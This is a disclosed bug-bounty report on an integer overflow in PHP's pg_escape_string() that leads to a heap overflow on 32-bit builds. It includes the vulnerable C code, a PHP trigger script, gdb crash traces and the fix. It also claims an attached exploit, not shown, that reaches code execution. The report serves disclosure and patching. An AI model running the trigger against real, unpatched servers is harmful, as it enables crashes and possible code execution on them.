# Heap overflow due to integer overflow in pg_escape_string() function

## Report Details
- **Report ID**: 180584
- **URL**: https://hackerone.com/reports/180584
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-11-07T07:34:11.572Z
- **Disclosed**: 2019-11-12T09:22:02.796Z

## Reporter
- **Username**: fosec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
The fix for this bug has been committed: https://bugs.php.net/bug.php?id=73399
Description:
------------
I have found some vulnerable code at `pg_escape_string()` function in module PostgreSQL. `pg_escape_string()` function creates a new zend_string object to store escaped string. The size of destination string depends on the size of source string. ( refer at `ext/pgsql/pgsql.c:4384` )

``` c
PHP_FUNCTION(pg_escape_string)
{
...
    zend_string *from = NULL, *to = NULL;
   
....
	to = zend_string_alloc(ZSTR_LEN(from) * 2, 0);
...
}
```

If length of `from` string is equal to PHP_INT_MAX, new string `to` will have an unexpected length. Due to missing check of size before calling
`zend_string_alloc()`, this new memory range can not use to store large data and lead to heap overflow. I can overwrite other objects of PHP in memory. This bug is only triggered in 32bit machine.

Solution:
It should be `zend_string_alloc_safe` instead of `zend_string_alloc`. 

Test script:
---------------
``` php
<?php
ini_set('memory_limit', -1);
$s = str_repeat("a",0x7FFFFFFF);
$escaped = pg_escape_string($s);
?>
```
Actual result:
--------------
Open php program in gdb and run test script, set a breakpoint at line in file `ext/pgsql/pgsql.c:4384`.
When debugger stops, we have the length of `from` string is 0x7fffffff. The size which is used as parameter in `_emalloc()` function is equal to `((0x7fffffff * 2 + 0x14 ) & 0xfffffffc)`. Due to integer overflow, new size is 0x10. The new memory region is too small to store a large string! 
```
 [----------------------------------registers-----------------------------------]
EAX: 0x36e00000 --> 0x2 
EBX: 0x8903068 --> 0x1 
ECX: 0x10 
EDX: 0xbfffc0d8 --> 0x36e00000 --> 0x2 
ESI: 0xb72130a0 --> 0x0 
EDI: 0xfffffffe 
EBP: 0x0 
ESP: 0xbfffc0b0 --> 0x1 
EIP: 0x81dfa4d (<zif_pg_escape_string+93>:	call   0x8312c90 <_emalloc>)
EFLAGS: 0x200202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x81dfa45 <zif_pg_escape_string+85>:	add    edi,edi
   0x81dfa47 <zif_pg_escape_string+87>:	lea    ecx,[edi+0x14]
   0x81dfa4a <zif_pg_escape_string+90>:	and    ecx,0xfffffffc
=> 0x81dfa4d <zif_pg_escape_string+93>:	call   0x8312c90 <_emalloc>
   0x81dfa52 <zif_pg_escape_string+98>:	test   ebp,ebp
   0x81dfa54 <zif_pg_escape_string+100>:	mov    ebx,eax
   0x81dfa56 <zif_pg_escape_string+102>:	mov    DWORD PTR [eax],0x1
   0x81dfa5c <zif_pg_escape_string+108>:	mov    DWORD PTR [eax+0x4],0x6
No argument
[------------------------------------stack-------------------------------------]
0000| 0xbfffc0b0 --> 0x1 
0004| 0xbfffc0b4 --> 0x84a3ac9 --> 0x69760053 ('a' <repeats 200 times>...)
0008| 0xbfffc0b8 --> 0xbfffc0d8 --> 0x36e00000 --> 0x2 
0012| 0xbfffc0bc --> 0xbfffc0dc --> 0x7fffffff ('a' <repeats 200 times>...)
0016| 0xbfffc0c0 --> 0x89b2db0 --> 0xb7d68450 --> 0x89b3030 --> 0x0 
0020| 0xbfffc0c4 --> 0x7fffffff ('a' <repeats 200 times>...)
0024| 0xbfffc0c8 --> 0x36e00000 --> 0x2 
0028| 0xbfffc0cc --> 0xb725f3a8 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x081dfa4d	122		zend_string *ret = (zend_string *)pemalloc(ZEND_MM_ALIGNED_SIZE(_ZSTR_STRUCT_SIZE(len)), persistent);
gdb-peda$ 
```

if we continue running, other memory region will be overwritten until SIGSEGV!
```
[----------------------------------registers-----------------------------------]
EAX: 0x61 ('a')
EBX: 0xb7f8b000 --> 0x2ae9c 
ECX: 0x0 
EDX: 0xb7400000 
ESI: 0x36f96fb1 ('a' <repeats 200 times>...)
EDI: 0x7fe6905f ('a' <repeats 200 times>...)
EBP: 0xb7400001 
ESP: 0xbfffc040 --> 0xbfffc090 --> 0x0 
EIP: 0xb7f6d287 (<PQescapeStringInternal+119>:	mov    BYTE PTR [edx],al)
EFLAGS: 0x210206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xb7f6d27e <PQescapeStringInternal+110>:	mov    BYTE PTR [ebp+0x0],al
   0xb7f6d281 <PQescapeStringInternal+113>:	lea    ebp,[edx+0x1]
   0xb7f6d284 <PQescapeStringInternal+116>:	add    esi,0x1
=> 0xb7f6d287 <PQescapeStringInternal+119>:	mov    BYTE PTR [edx],al
   0xb7f6d289 <PQescapeStringInternal+121>:	sub    edi,0x1
   0xb7f6d28c <PQescapeStringInternal+124>:	test   edi,edi
   0xb7f6d28e <PQescapeStringInternal+126>:	je     0xb7f6d297 <PQescapeStringInternal+135>
   0xb7f6d290 <PQescapeStringInternal+128>:	movzx  eax,BYTE PTR [esi]
[------------------------------------stack-------------------------------------]
0000| 0xbfffc040 --> 0xbfffc090 --> 0x0 
0004| 0xbfffc044 --> 0xb7fed6cd (<_dl_fixup+205>:	sub    esp,0x14)
0008| 0xbfffc048 --> 0xb7fffab0 --> 0xb7fffa54 --> 0xb754496c --> 0xb7fff8f8 --> 0x0 
0012| 0xbfffc04c --> 0x0 
0016| 0xbfffc050 --> 0x1 
0020| 0xbfffc054 --> 0x0 
0024| 0xbfffc058 --> 0xb7269060 ('a' <repeats 200 times>...)
0028| 0xbfffc05c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0xb7f6d287 in PQescapeStringInternal () from /lib/libpq.so.5
gdb-peda$ 
```
I can leak memory to bypass ASLR + DEP and control eip register to the arbitrary value. Finally, the overflow results as arbitrary code execution. I use PHP-7.1 (at https://github.com/php/php-src, commit 931ea5c872a0a4455c5bbb8470c7a1d049bd8501), run the attachment at local machine and get `/bin/sh`

## Attachments
- pg_escape_string_exploit.php
